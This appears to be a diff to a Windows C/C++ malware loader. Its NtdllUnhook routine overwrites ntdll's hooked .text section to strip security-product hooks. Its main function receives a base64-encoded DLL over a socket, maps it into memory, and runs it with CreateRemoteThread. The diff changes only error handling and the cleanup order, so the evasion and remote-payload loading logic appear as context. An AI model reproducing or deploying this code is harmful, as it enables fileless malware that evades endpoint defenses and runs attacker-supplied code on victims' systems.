@@ -24,7 +24,6 @@ BOOL  NtdllUnhook()
 
 	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
 		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-
 		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
 			DWORD oldProtection = 0;
 			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
@@ -38,7 +37,13 @@ BOOL  NtdllUnhook()
 	CloseHandle(ntdllMapping);
 	FreeLibrary(ntdllModule);
 
-	return TRUE;
+	if (GetLastError()==0)
+	{
+		return TRUE;
+	}
+	else {
+		return FALSE;
+	}
 }
 
 
@@ -79,6 +84,8 @@ int main(int argc,char* argv[])
 	//接收base64编码后的dll
 	dwFileSize = b64_decode((unsigned char*)bufferReceivedBytes, RecvBytes, (unsigned char *)DecodeBytes);
 	//解码dll写入DecodeBytes
+	iResult = closesocket(ConnectSocket);
+	delete[] bufferReceivedBytes;
 
 	LPVOID lpBaseAddress = MmLoadLibrary(DecodeBytes, dwFileSize);
 
@@ -88,7 +95,7 @@ int main(int argc,char* argv[])
 	//CreateThread(0, 0,(LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
 	CreateRemoteThread(GetCurrentProcess(), 0, 0, (LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
 
-	iResult = closesocket(ConnectSocket);
+
 	WSACleanup();
 	return 0;
 }
